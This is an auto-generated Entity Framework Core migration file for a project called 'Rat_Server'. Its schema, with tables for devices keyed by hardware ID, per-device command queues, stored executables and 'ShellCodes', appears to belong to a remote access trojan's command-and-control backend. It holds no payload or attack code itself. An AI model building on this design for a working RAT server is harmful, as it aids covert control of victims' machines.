﻿// <auto-generated />
using System;
using Microsoft.EntityFrameworkCore;
using Microsoft.EntityFrameworkCore.Infrastructure;
using Microsoft.EntityFrameworkCore.Migrations;
using Microsoft.EntityFrameworkCore.Storage.ValueConversion;
using Rat_Server.Model.Context;

#nullable disable

namespace Rat_Server.Migrations
{
    [DbContext(typeof(RatDbContext))]
    [Migration("20240810213041_MadeExeContentAsBytes")]
    partial class MadeExeContentAsBytes
    {
        /// <inheritdoc />
        protected override void BuildTargetModel(ModelBuilder modelBuilder)
        {
#pragma warning disable 612, 618
            modelBuilder
                .HasAnnotation("ProductVersion", "8.0.7")
                .HasAnnotation("Relational:MaxIdentifierLength", 64);

            modelBuilder.Entity("Rat_Server.Model.Entities.Admin", b =>
                {
                    b.Property<Guid>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)");

                    b.Property<Guid>("UserId")
                        .HasColumnType("char(36)");

                    b.HasKey("Id");

                    b.HasIndex("UserId")
                        .IsUnique();

                    b.ToTable("Admins");
                });

            modelBuilder.Entity("Rat_Server.Model.Entities.Command", b =>
                {
                    b.Property<Guid>("commandId")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)");

                    b.Property<string>("CommandValue")
                        .IsRequired()
                        .HasMaxLength(600)
                        .HasColumnType("varchar(600)");

                    b.Property<DateTime>("DateAdded")
                        .HasPrecision(5)
                        .HasColumnType("datetime(5)");

                    b.Property<Guid>("DeviceHwid")
                        .HasColumnType("char(36)");

                    b.Property<Guid>("DevicedHwid")
                        .HasColumnType("char(36)");

                    b.HasKey("commandId");

                    b.HasIndex("DeviceHwid");

                    b.ToTable("Commands");
                });

            modelBuilder.Entity("Rat_Server.Model.Entities.Device", b =>
                {
                    b.Property<Guid>("Hwid")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)");

                    b.Property<DateTime>("LastActive")
                        .ValueGeneratedOnAdd()
                        .HasPrecision(5)
                        .HasColumnType("datetime(5)")
                        .HasDefaultValue(new DateTime(2024, 8, 10, 14, 30, 40, 990, DateTimeKind.Local).AddTicks(9372));

                    b.Property<string>("Name")
                        .IsRequired()
                        .HasMaxLength(255)
                        .HasColumnType("varchar(255)");

                    b.HasKey("Hwid");

                    b.HasIndex("Hwid", "Name");

                    b.ToTable("Devices");
                });

            modelBuilder.Entity("Rat_Server.Model.Entities.ExeFile", b =>
                {
                    b.Property<int>("Id")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("int");

                    b.Property<byte[]>("Content")
                        .IsRequired()
                        .HasColumnType("longblob");

                    b.Property<string>("Name")
                        .IsRequired()
                        .HasColumnType("varchar(255)");

                    b.HasKey("Id");

                    b.HasIndex("Name")
                        .IsUnique();

                    b.ToTable("ExeFiles");
                });

            modelBuilder.Entity("Rat_Server.Model.Entities.ShellCode", b =>
                {
                    b.Property<int>("ShellCodeId")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("int");

                    b.Property<string>("Code")
                        .IsRequired()
                        .HasColumnType("longtext");

                    b.Property<string>("Name")
                        .IsRequired()
                        .HasColumnType("varchar(255)");

                    b.HasKey("ShellCodeId");

                    b.HasIndex("Name")
                        .IsUnique();

                    b.ToTable("ShellCodes");
                });

            modelBuilder.Entity("Rat_Server.Model.Entities.User", b =>
                {
                    b.Property<Guid>("UserId")
                        .ValueGeneratedOnAdd()
                        .HasColumnType("char(36)");

                    b.Property<string>("Name")
                        .IsRequired()
                        .HasMaxLength(50)
                        .HasColumnType("varchar(50)");

                    b.Property<string>("Password")
                        .IsRequired()
                        .HasMaxLength(100)
                        .HasColumnType("varchar(100)");

                    b.HasKey("UserId");

                    b.ToTable("Users");
                });

            modelBuilder.Entity("Rat_Server.Model.Entities.Admin", b =>
                {
                    b.HasOne("Rat_Server.Model.Entities.User", "User")
                        .WithOne("Admin")
                        .HasForeignKey("Rat_Server.Model.Entities.Admin", "UserId")
                        .OnDelete(DeleteBehavior.Cascade)
                        .IsRequired();

                    b.Navigation("User");
                });

            modelBuilder.Entity("Rat_Server.Model.Entities.Command", b =>
                {
                    b.HasOne("Rat_Server.Model.Entities.Device", "Device")
                        .WithMany("Commands")
                        .HasForeignKey("DeviceHwid")
                        .OnDelete(DeleteBehavior.Cascade)
                        .IsRequired();

                    b.Navigation("Device");
                });

            modelBuilder.Entity("Rat_Server.Model.Entities.Device", b =>
                {
                    b.Navigation("Commands");
                });

            modelBuilder.Entity("Rat_Server.Model.Entities.User", b =>
                {
                    b.Navigation("Admin");
                });
#pragma warning restore 612, 618
        }
    }
}
